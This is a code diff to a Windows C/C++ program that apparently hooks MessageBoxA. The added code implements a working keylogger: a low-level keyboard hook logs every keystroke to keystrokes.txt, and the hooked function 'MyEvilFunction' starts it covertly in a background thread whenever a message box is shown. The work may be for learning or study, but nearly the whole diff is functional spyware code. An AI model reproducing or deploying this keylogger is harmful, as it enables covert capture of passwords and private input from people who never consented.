@@ -1,14 +1,64 @@
 #include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <thread>
+#include <chrono>
 
 
-int (*originalMsgBox)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA;
+BOOL runThread = TRUE;
+HHOOK hookHandle;
+MSG msg;
 
-int MyEvilFunction(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
-    printf("This is my evil function!\n");
-    return originalMsgBox(hWnd, lpText, lpCaption, uType);
+HOOKPROC ProcessKeystroke(int code, WPARAM wParam, LPARAM lParam){
+    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+    if (p->vkCode == VK_ESCAPE) {
+      runThread = FALSE;
+      UnhookWindowsHookEx(hookHandle);
+      printf("Hooking disabled by esc.");
+      PostQuitMessage(0);
+      return 0;
+    }
+    FILE *fp = fopen("keystrokes.txt", "a+");
+    if (fp != NULL){
+        DWORD key = p->vkCode;
+        fprintf(fp, "%c", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
+        fclose(fp);
+    }
+    return 0;
 }
 
+
+LPTHREAD_START_ROUTINE Keylogger(){
+    printf("Keylogging started... tracking keystrokes");
+    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL,  (HOOKPROC) ProcessKeystroke, NULL, 0);
+    if (hookHandle == NULL){
+        printf("Failed to install hook handle.");
+        return  (LPTHREAD_START_ROUTINE) 1;
+    }
+    while (runThread && GetMessage( &msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    return (LPTHREAD_START_ROUTINE) 0;
+}
+
+int (*originalMsgBox)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA;
+int MyEvilFunction(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
+    printf("This is my evil function!\n");
+    HANDLE thread = CreateThread(
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE) Keylogger,
+        NULL,
+        0,
+        NULL
+    );
+
+    if (thread) {
+        CloseHandle(thread); // Release the handle; thread keeps running
+    }
+    return originalMsgBox(hWnd, lpText, lpCaption, uType);
+}
 
 void ParsePE(LPCSTR functionToHook ){
 
